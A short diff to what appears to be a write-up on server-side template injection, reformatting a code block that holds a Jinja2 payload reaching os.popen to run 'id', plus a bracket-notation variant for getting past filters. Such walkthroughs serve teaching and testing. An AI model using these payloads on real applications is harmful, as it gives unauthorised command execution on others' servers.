@@ -63,13 +63,11 @@ def login():
 
 
 
-``{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}``
-
-- to be
-
-``{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}``
-
-
+```pug
+{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
+# to be
+{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}
+```  
 
 now let's go test the web application :
 
